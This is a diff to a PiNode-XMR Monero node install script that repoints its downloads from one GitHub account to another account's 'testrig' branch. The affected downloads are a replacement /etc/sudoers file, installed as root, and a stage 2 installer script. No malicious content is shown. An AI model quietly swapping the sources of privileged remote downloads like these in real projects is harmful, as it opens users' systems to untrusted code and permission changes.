@@ -3,7 +3,7 @@
 ##Open Sources:
 # Monero github https://github.com/moneroexamples/monero-compilation/blob/master/README.md
 # Monero Blockchain Explorer https://github.com/moneroexamples/onion-monero-blockchain-explorer
-# PiNode-XMR scripts and custom files at my repo https://github.com/shermand100/pinode-xmr
+# PiNode-XMR scripts and custom files at my repo https://github.com/ff0255/pinode-xmr
 # PiVPN - OpenVPN server setup https://github.com/pivpn/pivpn
 # Atomic Swaps - https://github.com/AthanorLabs/atomic-swap
 # P2Pool - https://github.com/SChernykh/p2pool
@@ -25,7 +25,7 @@ sleep 3
 ##Replace file /etc/sudoers to set global sudo permissions/rules
 echo -e "\e[32mDownload and replace /etc/sudoers file\e[0m"
 sleep 3
-wget https://raw.githubusercontent.com/shermand100/PiNodeXMR/master/etc/sudoers
+wget https://raw.githubusercontent.com/ff0255/PiNodeXMR/testrig/etc/sudoers
 sudo chmod 0440 ~/sudoers
 sudo chown root ~/sudoers
 sudo mv ~/sudoers /etc/sudoers
@@ -69,7 +69,7 @@ sudo apt-get autoremove -y 2>&1 | tee -a /home/pinodexmr/debug.log
 #Download stage 2 Install script
 echo -e "\e[32mDownloading stage 2 Installer script\e[0m"
 sleep 3
-wget https://raw.githubusercontent.com/shermand100/PiNodeXMR/master/ubuntu-install-continue.sh
+wget https://raw.githubusercontent.com/ff0255/PiNodeXMR/testrig/ubuntu-install-continue.sh
 sudo mv ~/ubuntu-install-continue.sh /home/pinodexmr/
 sudo chown pinodexmr /home/pinodexmr/ubuntu-install-continue.sh
 sudo chmod 755 /home/pinodexmr/ubuntu-install-continue.sh
